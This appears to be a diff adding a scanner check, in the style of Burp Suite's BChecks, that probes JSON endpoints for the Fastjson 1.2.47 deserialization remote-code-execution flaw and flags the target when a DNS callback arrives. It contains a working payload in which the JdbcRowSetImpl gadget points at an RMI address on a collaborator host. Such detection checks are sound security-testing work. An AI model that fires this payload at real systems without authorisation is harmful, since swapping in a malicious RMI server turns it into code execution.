@@ -1,0 +1,24 @@
+metadata:
+  language: v1-beta
+  name: "Fastjson 1.2.47 Deserialization RCE"
+  description: "https://paper.seebug.org/1192/"
+  author: "Javeley"
+  tags: "Fastjson", "Deserialization","RCE","Alibaba"
+
+define:
+    payload = `\{"a":\{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":\{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{generate_collaborator_address()}/{random_str(4)}","autoCommit":true}}`
+
+
+given request then
+  if {base.request.body} matches "^[{]" and "application/json" in {base.request.headers} then
+      send request:
+          body: {payload}
+
+      if dns interactions then
+          report issue:
+              severity: high
+              confidence: certain
+              detail: "https://paper.seebug.org/1192/."
+              remediation: "https://paper.seebug.org/1192/."
+      end if 
+  end if
